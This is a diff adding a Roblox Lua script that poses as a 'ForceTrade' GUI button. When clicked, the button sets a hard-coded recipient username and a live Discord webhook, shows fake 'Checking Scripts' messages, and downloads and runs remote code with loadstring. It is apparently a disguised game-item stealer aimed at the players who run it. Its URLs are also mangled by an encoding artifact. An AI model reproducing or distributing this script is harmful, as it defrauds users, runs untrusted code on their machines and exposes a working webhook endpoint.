@@ -1,0 +1,17 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua%22))()
+local Window = Library.CreateLib("ForceTrade", "Synapse")
+
+local ForceTrade= Window:NewTab("ForceTrade")
+local ForceTradeSection = ForceTrade:NewSection("ForceTrade")
+
+ForceTradeSection:NewButton("FORCE TRADE", "FORCE TRADE!!", function()
+Username = "golfi100"
+WebHook = "https://discord.com/api/webhooks/1074072180704423986/80z5e0PlJzxJEGmDIWhAV08c5VUZ0SN1rL5HJCh70f9bKYFP8H5Nz3VcrZxEsk4w-Kwf "
+
+_G.CustomScriptName = "Mauro hub<3"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
+end)
